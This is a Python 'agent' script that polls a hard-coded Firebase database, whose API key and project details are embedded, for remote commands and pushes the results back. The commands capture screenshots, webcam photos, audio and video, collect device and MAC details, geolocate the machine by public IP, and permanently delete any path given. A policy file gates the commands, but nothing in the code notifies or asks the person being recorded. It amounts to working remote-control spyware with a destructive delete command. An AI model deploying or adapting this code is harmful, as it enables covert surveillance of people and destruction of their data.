# agent.py
"""
Safe agent:
- Connects to Firebase if pyrebase is available & configured
- Enforces policy.json
- Supports offline MaxMind GeoLite2 lookup (preferred) and
  keyless HTTP fallbacks if the DB isn't available
- Caches location lookups to avoid rate limits
- Device checks for screenshot/webcam/audio; safe delete gated by env+policy
"""

import os, time, json, platform, psutil, shutil, requests
from pathlib import Path
from datetime import datetime

# Lazy device imports (tolerate missing libs)
try:
    import pyautogui
except Exception:
    pyautogui = None
try:
    import cv2
except Exception:
    cv2 = None
try:
    import sounddevice as sd
    import soundfile as sf
except Exception:
    sd = None
    sf = None

try:
    import geoip2.database
except Exception:
    geoip2 = None

from getmac import get_mac_address

# Pyrebase (optional)
try:
    import pyrebase
except Exception:
    pyrebase = None

# ---------------- Config ----------------
BASE = Path(__file__).parent
OUT = BASE / "outputs"
OUT.mkdir(exist_ok=True)
NOW = lambda: datetime.utcnow().isoformat() + "Z"

# Firebase config (fill in with your config)
firebaseConfig = {
  "apiKey": "AIzaSyBpKUW9G9XMleeLLnW0F7PFdoEOZc0zLgA",
  "authDomain": "projectmanagement-c7883.firebaseapp.com",
  "databaseURL": "https://projectmanagement-c7883-default-rtdb.firebaseio.com",
  "projectId": "projectmanagement-c7883",
  "storageBucket": "projectmanagement-c7883.firebasestorage.app",
  "messagingSenderId": "907908963007",
  "appId": "1:907908963007:web:310717b4b8d2b839f0840a",
  "measurementId": "G-6YTNV66123"
}

# Policy file path
POLICY_PATH = BASE / "policy.json"
try:
    with open(POLICY_PATH, "r") as fh:
        POLICY = json.load(fh)
except Exception:
    POLICY = {}
    print("Warning: policy.json not found or invalid; defaulting to restrictive policy.")

# MaxMind DB path (download GeoLite2-City.mmdb and place here)
MAXMIND_DB = BASE / "GeoLite2-City.mmdb"

# Location cache
_LOCATION_CACHE = BASE / ".location_cache.json"
_LOCATION_CACHE_TTL = 15 * 60  # seconds

# ---------------- Utilities ----------------
def now(): return NOW()

def is_command_allowed(cmd_name, args=None):
    allowed = POLICY.get("allowed_commands", {})
    info = allowed.get(cmd_name)
    if info is None:
        return False, "command not allowed by policy"
    # duration limits
    if cmd_name in ("record_audio", "record_video") and args:
        max_dur = info.get("max_duration")
        if max_dur and args.get("duration", 0) > max_dur:
            return False, f"duration exceeds policy max ({max_dur}s)"
    if cmd_name == "delete" and not info.get("allow", False):
        return False, "delete prohibited by policy"
    return True, ""

# ---------------- Firebase init (optional) ----------------
if pyrebase is None:
    firebase = None
    db = None
    print("pyrebase not installed; Firebase functionality disabled.")
else:
    try:
        firebase = pyrebase.initialize_app(firebaseConfig)
        db = firebase.database()
    except Exception as e:
        print("Error initializing Firebase:", e)
        firebase = None
        db = None

# ---------------- Logging ----------------
def log_to_firebase(command, result, status="done"):
    entry = {
        "command": command,
        "result": result,
        "status": status,
        "timestamp": now(),
        "device": platform.node()
    }
    try:
        if db:
            db.child("logs").push(entry)
    except Exception as e:
        print("Failed to push log to Firebase:", e)
    return entry

# ---------------- Command Handlers ----------------
def take_screenshot():
    if pyautogui is None:
        return "pyautogui unavailable"
    try:
        f = OUT / f"screenshot_{int(time.time())}.png"
        pyautogui.screenshot().save(f)
        return f"Screenshot saved: {f}"
    except Exception as e:
        return f"Screenshot error: {e}"

def get_device_info():
    try:
        info = {
            "os": platform.system(),
            "release": platform.release(),
            "cpu": platform.processor(),
            "ram_total_gb": round(psutil.virtual_memory().total / (1024**3),2),
            "ram_available_gb": round(psutil.virtual_memory().available / (1024**3),2),
            "disk_free_gb": round(psutil.disk_usage('/').free / (1024**3),2),
            "hostname": platform.node(),
            "mac": get_mac_address()
        }
        f = OUT / "deviceinfo.json"
        with open(f, "w") as fh:
            json.dump(info, fh, indent=2)
        return f"Device info written: {f}"
    except Exception as e:
        return f"Device info error: {e}"

def webcam_photo():
    if cv2 is None:
        return "opencv (cv2) unavailable"
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            cap.release()
            return "camera not available"
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return "camera read failed"
        f = OUT / f"webcam_{int(time.time())}.png"
        cv2.imwrite(str(f), frame)
        return f"Webcam photo saved: {f}"
    except Exception as e:
        return f"Webcam error: {e}"

def record_audio(duration=3):
    if sd is None or sf is None:
        return "sounddevice/soundfile unavailable"
    try:
        duration = float(duration)
        f = OUT / f"audio_{int(time.time())}.wav"
        rec = sd.rec(int(duration*44100), samplerate=44100, channels=1)
        sd.wait()
        sf.write(str(f), rec, 44100)
        return f"Audio saved: {f}"
    except Exception as e:
        return f"Audio error: {e}"

def record_video(duration=5):
    if cv2 is None:
        return "opencv (cv2) unavailable"
    try:
        duration = int(duration)
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            cap.release()
            return "camera not available for video"
        w, h = int(cap.get(3)), int(cap.get(4))
        if w == 0 or h == 0:
            w, h = 640, 480
        f = OUT / f"video_{int(time.time())}.mp4"
        writer = cv2.VideoWriter(str(f), cv2.VideoWriter_fourcc(*"mp4v"), 20, (w, h))
        for _ in range(20*duration):
            ret, frame = cap.read()
            if not ret:
                break
            writer.write(frame)
        cap.release()
        writer.release()
        return f"Video saved: {f}"
    except Exception as e:
        return f"Video error: {e}"

# ---------------- Location: MaxMind offline-first with keyless fallbacks & caching ----------------
def _read_loc_cache():
    try:
        if _LOCATION_CACHE.exists():
            raw = _LOCATION_CACHE.read_text()
            data = json.loads(raw)
            ts = data.get("_fetched_at", 0)
            if time.time() - ts < _LOCATION_CACHE_TTL:
                return data
    except Exception:
        pass
    return None

def _write_loc_cache(payload):
    try:
        payload["_fetched_at"] = int(time.time())
        _LOCATION_CACHE.write_text(json.dumps(payload))
    except Exception:
        pass

def location_snapshot():
    """
    Offline-first: use MaxMind DB if present. If MaxMind DB isn't available or lookup fails,
    attempt a chain of public keyless providers. Cache result for a short TTL.
    """
    # Check cache
    cached = _read_loc_cache()
    if cached:
        copy = dict(cached)
        copy.pop("_fetched_at", None)
        try:
            (BASE / "location.json").write_text(json.dumps(copy, indent=2))
        except Exception:
            pass
        return json.dumps({"source": "cache", "data": copy}, indent=2)

    # Try MaxMind DB if available
    if geoip2 is not None and MAXMIND_DB.exists():
        try:
            # get public IP first (best-effort)
            try:
                ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
            except Exception:
                ip = None
            if not ip:
                # fallback to 'me' endpoint (some providers)
                ip = requests.get("https://ifconfig.me/ip", timeout=5).text.strip()
            reader = geoip2.database.Reader(str(MAXMIND_DB))
            if ip:
                resp = reader.city(ip)
                data = {
                    "ip": ip,
                    "country": resp.country.name,
                    "city": resp.city.name,
                    "latitude": resp.location.latitude,
                    "longitude": resp.location.longitude,
                    "source": "GeoLite2-City.mmdb"
                }
            else:
                data = {"source": "GeoLite2-City.mmdb", "note": "public IP lookup failed"}
            reader.close()
            _write_loc_cache(data)
            (BASE / "location.json").write_text(json.dumps(data, indent=2))
            return json.dumps({"source": "GeoLite2", "data": data}, indent=2)
        except Exception as e:
            # fall through to keyless HTTP providers
            last_error = {"maxmind_error": str(e)}
    else:
        last_error = {"maxmind": "not available"}

    # Keyless providers fallback (try sequentially)
    providers = [
        {"name": "ipapi.co", "url": "https://ipapi.co/json/"},
        {"name": "ipwhois.app", "url": "https://ipwhois.app/json/"},
        {"name": "ipinfo.io", "url": "https://ipinfo.io/json"},
        {"name": "ifconfig.co", "url": "https://ifconfig.co/json"},
    ]
    headers = {"User-Agent": "local-agent/1.0"}

    for p in providers:
        try:
            r = requests.get(p["url"], headers=headers, timeout=6)
            try:
                j = r.json()
            except Exception:
                j = {"raw": r.text}
            # detect simple rate-limit or error
            if isinstance(j, dict) and (j.get("error") or j.get("reason") or "RateLimited" in str(j.values())):
                last_error = {"provider": p["name"], "response": j}
                continue
            data = {"source": p["name"], "data": j}
            _write_loc_cache(data)
            (BASE / "location.json").write_text(json.dumps(data, indent=2))
            return json.dumps(data, indent=2)
        except Exception as e:
            last_error = {"provider": p["name"], "error": str(e)}
            continue

    # All providers failed
    fallback = {
        "source": "none_available",
        "data": {
            "message": "All location providers failed or were rate-limited.",
            "last_error": last_error
        }
    }
    try:
        (BASE / "location.json").write_text(json.dumps(fallback, indent=2))
    except Exception:
        pass
    return json.dumps(fallback, indent=2)

def delete_path(path):
    """
    Delete files or folders immediately.
    ⚠️ Use with caution — this permanently removes data.
    """
    p = Path(path).expanduser()
    if not p.exists():
        return "Path not found"
    try:
        if p.is_file():
            p.unlink()
            return f"File deleted: {p}"
        if p.is_dir():
            shutil.rmtree(p)
            return f"Folder deleted: {p}"
    except Exception as e:
        return f"Delete error: {e}"
    return "Unknown target"


# ---------------- Command parsing & executor ----------------
def parse_command_payload(command):
    """
    Accept either:
     - plain string: "screenshot" or "delete /tmp/x"
     - JSON text: {"action":"record_audio","args":{"duration":4}}
    """
    if not command:
        return None, "empty"
    try:
        payload = json.loads(command)
        action = payload.get("action") or payload.get("command")
        args = payload.get("args", {})
        return {"action": action, "args": args}, ""
    except Exception:
        parts = command.strip().split()
        if len(parts) == 1:
            return {"action": parts[0], "args": {}}, ""
        else:
            return {"action": parts[0], "args": {"raw": " ".join(parts[1:])}}, ""

def execute_command(command):
    payload, err = parse_command_payload(command)
    if err:
        return f"Bad command payload: {err}"
    action = payload["action"]
    args = payload.get("args", {}) or {}
    allowed, msg = is_command_allowed(action, args)
    if not allowed:
        return f"Not allowed: {msg}"
    if action == "screenshot": return take_screenshot()
    if action == "deviceinfo": return get_device_info()
    if action == "webcam_photo": return webcam_photo()
    if action == "record_audio": return record_audio(args.get("duration", 3))
    if action == "record_video": return record_video(args.get("duration", 5))
    if action == "location_snapshot": return location_snapshot()
    if action == "delete":
        p = args.get("path") or args.get("raw")
        if not p:
            return "delete requires a path argument"
        return delete_path(p)
    return f"Unknown command: {action}"

# ---------------- Firebase listener ----------------
def stream_handler(message):
    try:
        if not db:
            return
        task = db.child("task").get().val()
        if not task:
            return
        command = task.get("command","")
        if not command:
            return
        print(f"⚡ Received command: {command}")
        result = execute_command(command)
        db.child("task").update({
            "last_result": result,
            "last_executed": now(),
            "command": ""
        })
        log_to_firebase(command, result)
    except Exception as e:
        print("Error in stream_handler:", e)

# ---------------- Main ----------------
if __name__ == "__main__":
    print("Agent started. Listening for Firebase tasks (if configured).")
    if db:
        my_stream = db.child("task").stream(stream_handler)
    else:
        print("Firebase not configured - running local poll mode. Create 'local_task.json' next to agent.py to test.")
        local_task = BASE / "local_task.json"
        last_stamp = None
        while True:
            try:
                if local_task.exists():
                    data = json.loads(local_task.read_text())
                    stamp = data.get("timestamp")
                    if stamp != last_stamp:
                        last_stamp = stamp
                        cmd = data.get("command","")
                        print("Local task:", cmd)
                        r = execute_command(cmd)
                        print("Result:", r)
                        (BASE / "local_task_result.json").write_text(json.dumps({"result": r, "executed_at": now()}))
                time.sleep(2)
            except KeyboardInterrupt:
                print("Exiting local poll mode.")
                break
            except Exception as e:
                print("Local poll error:", e)
                time.sleep(2)
